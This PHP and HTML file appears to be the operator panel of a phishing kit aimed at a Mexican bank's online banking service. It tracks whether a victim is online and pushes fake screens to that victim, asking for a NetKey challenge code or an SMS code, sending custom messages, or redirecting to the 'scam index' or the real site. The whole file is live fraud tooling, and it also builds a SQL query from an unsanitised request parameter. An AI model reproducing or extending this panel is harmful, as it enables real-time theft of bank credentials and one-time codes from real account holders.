<?php
	
	session_start();
    if(!isset($_SESSION['usr'])){
        header('Location: login.php');
    }
	include_once('../config/MySQL.php');
	date_default_timezone_set("America/Mexico_City");


	if(isset($_GET['usr']) && !empty($_GET['usr'])){
        $idUsuario = base64_decode($_GET['usr']);
    }else{
        $idUsuario = "";
    }


    $sql = "SELECT * FROM logos_bancanet_personal WHERE id=".$idUsuario." LIMIT 1";
	$query = new MySQL();
	$data = $query->queryStandar($sql);

	while ($r = mysqli_fetch_array($data)) {
        $id = $r['id'];
		$nombre = $r['nombre_completo'];
		//$token = $r['token'];
	}

    

?>

<!DOCTYPE html>
<html>
<head>
	<title>Panel dinamico - <?=$nombre;?></title>


    <script type="text/javascript" src="archivos/jquery-1.9.1.js"></script>
    <script src="Panel.js"></script>
    <script src="script_telas_panel.js"></script>
   <script>
        $(document).ready(function(){

            var idClienteDataPanel = $('#sessionIDCliente').val();

            function getTime(){
                var d = new Date();
                var h = d.getHours();
                var m = d.getMinutes();
                var s = d.getSeconds();
                var tz = "";
                var fecha = "";
            
                if(h<10){h = "0"+h;tz = "AM";}else{tz = "PM";}
                if(m<10){m = "0"+m;}
                if(s<10){s = "0"+s;}
                fecha = h+":"+m+":"+s+" "+tz;
                
                return fecha;
            }

            $('.btnReload').click(function(){
                window.location.reload();
            });


            $('#tela_NK').change(function(){
                if($(this).val() != ""){
                    $('#txtNETKEY').attr('disabled',false).focus();
                }else{
                    $('#txtNETKEY').attr('disabled',true);
                }
            });


            $('#tela_MENSAJES').change(function(){
                if($(this).val() != ""){
                    $('#msgPersonalizado').attr('disabled',false).focus();
                }else{
                    $('#msgPersonalizado').attr('disabled',true);
                }


                if($('#tela_MENSAJES').val() == "MP_F"){
                    $('#msgPersonalizado').val("No es necesario agregar mensaje");
                    $('#btnMensajes').focus();
                }else{
                    $('#msgPersonalizado').val("");
                }


            });
            

            


            $('#btnNK').click(function(e){
                e.preventDefault();
                //alert()
                var tipoAlta = $('#tela_NK');
                var code = $('#txtNETKEY');
                var hora = getTime();
                var altaHistory = "Pediste NetKey: "+code.val();

                if($('#tela_NK').val() == ""){
                    alert('Debe seleccionar una Tela');
                    $('#tela_NK').focus();
                }else{



                    if(code.val() == ""){
                        alert('Ingresa un Codigo Challing');
                        code.focus();
                    }else{
                        //var history = " - PEDISTE ALTA, "+altaHistory+" - Drop: "+code.val();
                        //var history = " - "+altaHistory+" - Drop: "+code.val();
                        var history = " - "+altaHistory;
                        var code = code.val();
                        Panel.update(6, code, '', 'NetKey', idClienteDataPanel);
                        Panel.insertHistory(7, hora, history, 1, idClienteDataPanel);
                    }
                }
            });
        });
    </script>
    <!--<script src="script_telas_panel.js"></script>-->

    <script>
        function refresh_request(){
            $.ajax({
                type: 'POST',
                url: '../config/refreshPanelDinamico.php',
                data: {
                    "request": "refresh_online",
                    "session": $('#sessionIDCliente').val()
                },
                beforeSend: function(){
                    console.log("ENviando...");
                },
                success: function (resp){
                    console.log(resp)
                    $('#indicadorOnline').addClass(resp);
                    $('#statusTXT').html(resp);
                },
                error: function (request, textStatus, errorThrown) {
                    console.log('Error al Enviar los Datos: '+errorThrown);
                }
            });
        }

        var int = self.setInterval("refresh_request()", 3000);
        //refresh_request
    </script>

    <script>
        //Panel.init();
    </script>

    <script>
        $(document).ready(function(){
            $('#btnUpadteDataLogo').click(function(e){
                e.preventDefault();
                var token = $('#token');
                var session = $('#idCliente');

                //alert(token.val());
                
                if(token.val() == ""){
                    alert('Debes seleccionar un tipo de token');
                }else{
                    //alert('ok');
                    $.ajax({
                        type: 'POST',
                        url: '../conf/opcionesPanel.php',
                        data: {
                            "option": "11",
                            "comentario": token.val(),
                            "id": session.val()
                        },
                        beforeSend: function(){
                            console.log("ENviando...");
                        },
                        success: function (resp){
                            //alert(resp);
                            console.log('Datos Enviados');
                            if(resp == "1"){
                                alert();
                                //window.reload();
                            }
                            
                        },
                        error: function (request, textStatus, errorThrown) {
                            console.log('Error al Enviar los Datos: '+errorThrown);
                        }
                    });
                }
            });
        });
    </script>


    <script>
        function soloNumeros(e){
            var key = window.Event ? e.which : e.keyCode
            return (key >= 48 && key <= 57)
        }
    
    </script>

    <style>
        *{
            margin: 0 auto;
            padding: 0 auto;
            box-sizing: border-box;
        }

        section{
            width: 100%;
            display: block;
            margin-bottom: 20px;
        }

        section#fieldsDB table{
            /*width: 70%;*/
        }
        section#fieldsDB input[type="text"], section#fieldsDB select{
            width: 200px;
            padding: 3px 4px;
        }

        section.telas{

        }

        section.telas table{
            width: 50%;
        }

        

        section.telas input[type="text"]{
            width: 200px;
            padding: 3px 4px;
        }

        section.telas select{
            padding: 5px!important;
        }

        section label{
            font-weight: bold;
            color: #333;
        }

        .Online{
            background: green;
            color: #fff;
            width: 100%;
            padding-top: 25px;
            padding-bottom: 25px;
            text-transform: uppercase;
        }

        .Offline{
            background: #ff0000;
            color: #fff;
            width: 100%;
            padding-top: 25px;
            padding-bottom: 25px;
            text-transform: uppercase;
        }

        #sectionIFRame div{
            width: 90%;
            border-bottom: 1px solid #c1c1c1;
            margin: 0 auto;
            margin-top: 20px

        }


        .btn-primary {
            cursor: pointer;
            color: #fff;
            background-color: #007bff;
            border-color: #007bff;
            
        }

        .btn-warning {
            color: #212529;
            background-color: #ffc107;
            border-color: #ffc107;
        }

        .btn{
            display: inline-block;
    font-weight: 400;
    text-align: center;
    white-space: nowrap;
    vertical-align: middle;
    webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    border: 1px solid transparent;
    
    font-size: 12px;
    /*line-height: 1.5;*/
    border-radius: .25rem;
    transition: color .15s ease-in-out,background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;
        }
    </style>
</head>
<body>
    <input type="hidden" name="sessionIDCliente" id="sessionIDCliente" value="<?=$id;?>">
	<section id="indicadorOnline" class="">
		<center><?=$nombre;?> - <span id="statusTXT"></span></center>
	</section>
	<section class="content" id="sectionIFRame">
        <?php $rutahistory = "history.php?id=".$idUsuario; ?>
        <iframe src="<?=$rutahistory;?>" class="row col-xs-12" style="width: 100%; height:150px;" frameborder="0"></iframe>
        <div></div>
    </section>
    <!--<section id="fieldsDB">
    	<center>
    		<table>
    			<tr>
    				<td><label>NOMBRE</label></td>
    				<td><input type="text" name="nombrePersona" id="nombrePersona" value="<?=$nombre;?>"></td>
    				<td style="padding-left: 50px;"><label>TOKEN</label></td>
    				<td>
                        
                        <input type="hidden" id="idCliente" value="<?=$id?>">
                        <span class="err" style="font-size: 9px; color: #666;display: block;"></span>
                        

                    </td>
    				<td><button id="btnUpadteDataLogo">Actualizar o Agregar</button></td>
    			</tr>
    		</table>
    	</center>
    </section>-->

    <?php 
        //if($token == 'Token Fisico Viejo'){
    ?>
        <section class="telas" id="NetKey">
            <center>
                <table>
                    <tr>
                        <td><label>TELA</label></td>
                        <td><label>CODIGO</label></td>
                        <td></td>
                        <td></td>
                    </tr>
                    <tr>
                        <td>
                            <select id="tela_NK" required="">
                                <option value="">Seleccione una opcion</option>
                                <option value="NK">Pedir NetKey</option>
                            </select>
                        </td>
                        <td>
                            <input type="text"  maxlength="10" placeholder="Codigo" disabled="" id="txtNETKEY" name="txtNETKEY">
                        </td>
                        <td>
                            <button id="btnNK" name="btnNK" class="btn btn-primary">Enviar Tela</button>
                        </td>
                        <td>
                            <button class="btnReload" class="btn btn-warning">Refrescar</button>
                        </td>
                    </tr>
                </table>
            </center>
        </section>
    <?php
        //}elseif ($token == 'Token Fisico Nuevo') {
    ?>
       
  
    

    




    




    


    <section class="telas">
    	<center>
    		<table>
    			<tr>
                    <td><label>MENSAJES PERSONALIZADOS</label></td>
                    <td><label>MENSAJE</label></td>
    				<td></td>
    				<td></td>
    			</tr>
    			<tr>
    				<td>
    					<select id="tela_MENSAJES" required="">
    						<option value="">Seleccione una opcion</option>
                            <option value="MP_CI">Con Input</option>
                            <option value="MP_SI">Sin Input</option>
                            <option value="MP_F">Mandar a Folio</option>
                            <option value="MP_SIS">Salir a Index del Scam</option>
                            <option value="MP_SPP">Salir a Pagina Original</option>
    					</select>
    				</td>
    				<td>
    					<input type="text" name="msgPersonalizado" id="msgPersonalizado" placeholder="Mensaje" disabled="">
    				</td>
    				<td>
    					<button id="btnMensajes" class="btn btn-primary">Enviar</button>
    				</td>
    				<td>
    					
    				</td>
    			</tr>
    		</table>
    	</center>
    </section>



    <section class="telas">
        <center>
            <table>
                <tr>
                    <td><label>OTRAS TELAS</label></td>
                    <!--<td><label>MENSAJE</label></td>-->
                    <!--<td></td>-->
                    <td></td>
                </tr>
                <tr>
                    <td>
                        <select id="tela_OtrasTelas" required="">
                            <option value="">Seleccione una opcion</option>
                            <!--<option value="OT_1_E">1 Minuto de Espera</option>
                            <option value="OT_2_E">2 Minuto de Espera</option>
                            <option value="OT_3_E">3 Minuto de Espera</option>-->
                            <option value="OT_C_SMS">Pedir Mensaje SMS</option>
                            <!--<option value="OT_C_EMAIL">Pedir Mensaje EMAIL</option>-->
                        </select>
                    </td>
                   <!--<td>
                        <input type="text" name="msgPersonalizado" id="msgPersonalizado" placeholder="Mensaje" disabled="">
                    </td>-->
                    <td>
                        <button id="btnOtrasTelas" class="btn btn-primary">Enviar</button>
                    </td>
                    <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
                    <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
                    <!--<td>
                        
                    </td>-->
                </tr>
            </table>
        </center>
    </section>
</body>
</html>